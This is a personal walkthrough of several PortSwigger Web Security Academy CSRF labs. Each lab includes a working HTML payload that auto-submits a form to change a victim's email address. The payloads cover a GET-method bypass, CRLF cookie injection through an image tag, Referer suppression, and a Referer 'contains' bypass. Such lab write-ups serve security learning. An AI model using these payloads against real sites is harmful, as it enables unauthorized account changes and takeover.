# Lab 1: CSRF vulnerability with no defenses

**Description :**

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

First we need to log in using the given cred and then the actual over all what we done is that , we need to craft the html code , that hides the specific url and the send the /my-account/change-mail when the victim opens the link , the browser loads the send the request to the site alone with the session cookie and then the server also accept it and the does the following request and change the email id , payload that we used is
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://lab-port-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="abc&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

---

# Lab 2: CSRF where token validation depends on request method

**Description:**

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

As we did in the first lab , log in using the creds and then go the exploit server and then paste the payload 
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://0a5900100367c2c880ba2be60083007d.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="abcG&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

the difference between the first and second is that , at first we use the POST request method and now we are using the GET method , because **Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.**

store and then click the deliver to victim . and solve the lab

-----

## LAB 3:CSRF where token validation depends on token being present

**Description :**

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution : **

As we did in the previous lab , the same thing we need to do is that , log in to the myaccount and then go to the exploit server , and the paste the payload 

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://0aff00c50336f85d800fee7900480060.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="abdc&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

and store and then send to the victim and  lab got solved

-----

## LAB 5: CSRF where token is tied to non-session cookie

**Description :**

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

**Solution :**

At first , we have the two user , login and update the mail using the two user , I have note that csrf_key and the csrf_token are same for the both users and then , we need to craft the html payload ,

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="carlo&#64;test&#46;com" />
    <input type="hidden" name="csrf" value="csrf-token" />
    <input type="submit" value="Submit request" />
 <img src="https://0abd0097039d043a805d039800d400d0.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ryhD6ATUgAdDHyoaK41HaAWfdRz5XJJz%3b%20SameSite=None" onerror="document.forms[0].submit()"
</form>
</body>
</html>
```

what actually the payload does is that 
### Stage 1: The Cookie Injection (The "Setup")

Before the server will accept a forged request, it checks for a matching pair: a **CSRF token** in the form and a **CSRF cookie** in the browser. The attacker uses an `<img>` tag to force the victim's browser to save the attacker's own cookie.

- **The Tool**: It uses a "broken" search feature to perform a **CRLF Injection**.
    
- **The Payload**: `%0d%0aSet-Cookie:%20csrfKey=ryhD6AT...`.
    
- **The Result**: The browser tries to "load" the image, but instead, it receives a command from the server to save the attacker’s `csrfKey` cookie into the victim's browser storage.
    

### Stage 2: The Form Submission (The "Attack")

Once the cookie is planted, the script needs to send the request that actually changes the account details.

- **The Trigger**: The `onerror` attribute in the `<img>` tag acts as a timer. Since the "image" URL is actually a search command, it fails to load, triggering the `onerror` event which calls `document.forms[0].submit()`.
    
- **The Data**: The form sends a new email address (`carlo@test.com`) and a **CSRF token** (`de5vwom...`).

---------

# Lab 6: CSRF where token is duplicated in cookie

**Description :**

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

At first , we need to login using the creds and then update the mail and see the request using the burp 
```
POST /my-account/change-email HTTP/2
Host: 0a67006904ff9497811eb1d10047009d.web-security-academy.net
Cookie: csrf=jZhDaGvOt7SQ8DC4Vl5BTPuFOPiPsUSz; session=1FrMdtur1eg0GA29eCwLKm2YSwpoTw6A
Content-Length: 56
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0a67006904ff9497811eb1d10047009d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a67006904ff9497811eb1d10047009d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=test%40gmail&csrf=jZhDaGvOt7SQ8DC4Vl5BTPuFOPiPsUSz
```

the csrf in the cookie and then at the least is same , so it is validating by camparing this two are same or not ... , we craft the payload

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://0a67006904ff9497811eb1d10047009d.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="carloo&#64;test&#46;com" />
    <input type="hidden" name="csrf" value="jZhDaGvOt7SQ8DC4Vl5BTPuFOPiPsU" />
    <input type="submit" value="Submit request" />
 <img src="https://0a67006904ff9497811eb1d10047009d.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=jZhDaGvOt7SQ8DC4Vl5BTPuFOPiPsU%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
</form>
</body>
</html>
```

the two csrf are same , store and click the deliver to victim , the lab got solved

-----

# Lab: CSRF where Referer validation depends on header being present

**Description :**

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

first we need to login and then update the mail and then see the request , i have the http referer header , by changing the value it rejected it , so we craft the payload 

```
<html>
<head>
<meta name="referrer" content="no-referrer">
</head>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://0ab600970427947a816dca1600f6009b.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="abcd&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

, by adding the one more extra header that is `<meta name="referrer" content="no-referrer">` which is use to reject the referer header , lab got solved

----

# Lab: CSRF with broken Referer validation

**Description :**

This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

at first login in to your creds and then update the mail and the see the request in the burpsuite , if the changing the http referer header , the server rejects it , so it only validates if the url of the domain has in it or not , so for that we are crafting the payload 

```
<html>
<body>
<script>history.pushState('', '', '/?0a1600c0040d1f1480880d2d00e00014.web-security-academy.net')</script>
    <form action="https://0a1600c0040d1f1480880d2d00e00014.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="abcd&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

why we are setting the url to the history.pushstate , because the url of the domain is there , and then we need to add the `Referrer-Policy: unsafe-url` in header of the exploit server , so we are telling the browser send the url as such , not converting the url to domain name.

## 1. The "Contains" Domain Bypass

The server you are attacking is likely using a naive check to see if the **Referer header** contains its own domain name.

- **The Goal**: The attacker wants the `Referer` header to look like it's coming from the vulnerable site.
    
- **The Trick**: Look at your `history.pushState` line: `/?0a1600c0040d1f1480880d2d00e00014.web-security-academy.net`
    
- **How it works**: By pushing this string into the URL path, the attacker ensures that the target's domain name appears somewhere in the URL of the malicious page. When the form submits, the browser sends this long URL in the Referer header, tricking the server's "Contains" check.
    

---

## 2. What is `Referrer-Policy: unsafe-url`?

This is the most critical part of this specific exploit. By default, modern browsers are "privacy-conscious." If you move from an `HTTPS` site to another `HTTPS` site, the browser often "strips" the Referer header to just the domain (e.g., `https://attacker.com/`) and hides the rest of the path.

If the browser only sends the domain, the server won't see the "trick" string you put in the URL path, and the attack will fail.

- **The Purpose**: `Referrer-Policy: unsafe-url` tells the browser: _"Do not hide anything. Send the full URL, including the query string and path, to any origin."_.
    
- **The Result**: This forces the browser to send the **entire** URL in the header, ensuring the server sees the vulnerable domain string you hid in the path.

----



